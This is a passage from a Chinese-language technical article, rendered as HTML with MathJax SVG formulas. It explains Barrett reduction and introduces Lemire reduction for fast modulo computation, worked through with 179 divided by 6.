354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(746.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(1802.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>，那么这个范围内<strong>只能包含一个整数</strong>，保证计算结果正确。</p>
<p>总的来说，巴雷特约简就是将运行时的除法开销转移到了编译时。</p>
<h5 id="lemire-约简lemire-reduction">Lemire 约简（Lemire
Reduction）</h5>
<p><strong>Barrett
约简</strong>是一种比较复杂的算法，而且它通过间接计算来生成一系列指令用于求模运算，因此可能会带来一些性能上的开销。而一种新的方法——Lemire
降维法（2019年提出）则更简单，并且在某些情况下，实际上比 Barrett
方法更快。尽管目前这个方法还没有一个公认的名称，但在这里我们称其为
<strong>Lemire 约简</strong>。</p>
<p>假设我们有一个整数 <code>179</code> 和除数
<code>6</code>，它们的除法结果可以表示为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex;" xmlns="http://www.w3.org/2000/svg" width="25.383ex" height="4.661ex" role="img" focusable="false" viewBox="0 -1352 11219.3 2060"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(1000,0)"></path></g><g data-mml-node="mn" transform="translate(720,-686)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><rect width="1700" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2217.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3273.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1278,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1778,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(2278,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(2778,0)"></path></g><g data-mml-node="mo" transform="translate(6551.6,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mo" transform="translate(6996.2,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mo" transform="translate(7440.9,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mo" transform="translate(7885.6,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(8941.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1278,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1778,0)"></path></g></g></g></svg></mjx-container></span> 这个浮点数表示为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="61.979ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 27394.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(1000,0)"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mn" transform="translate(2000,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><g data-mml-node="mo" transform="translate(2777.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3833.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1278,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1778,0)"></path></g><g data-mml-node="mstyle" transform="translate(6111.6,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mtext" transform="translate(7111.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">（</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">或</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">者</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">表</text><text data-variant="normal" transform="translate(4000,0) scale(1,-1)" font-size="884px" font-family="serif">示</text><text data-variant="normal" transform="translate(5000,0) scale(1,-1)" font-size="884px" font-family="serif">为</text><text data-variant="normal" transform="translate(6000,0) scale(1,-1)" font-size="884px" font-family="serif">浮</text><text data-variant="normal" transform="translate(7000,0) scale(1,-1)" font-size="884px" font-family="serif">点</text><text data-variant="normal" transform="translate(8000,0) scale(1,-1)" font-size="884px" font-family="serif">数</text><text data-variant="normal" transform="translate(9000,0) scale(1,-1)" font-size="884px" font-family="serif">：</text></g><g data-mml-node="mn" transform="translate(17111.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(2500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(4278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(5278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(6278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(7278,0)"></path></g><g data-mml-node="mo" transform="translate(25056.2,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mtext" transform="translate(26394.9,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">）</text></g></g></g></svg></mjx-container></span> 在这种表示下，我们如何提取我们所需要的部分呢？</p>
<ol type="1">
<li><strong>整数部分</strong>（29）可以通过简单地取浮点数的小数点前部分（即取整）来获得。</li>
<li><strong>小数部分</strong>（即分数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex;" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span>）可以通过取小数点后的部分得到。</li>
<li><strong>余数</strong>（5）则可以通过将小数部分乘以除数
<code>y</code> 来得到。</li>
</ol>
<p>对于 32 位整数，我们可以设定一个常量 <code>s = 64</code>，并查看在
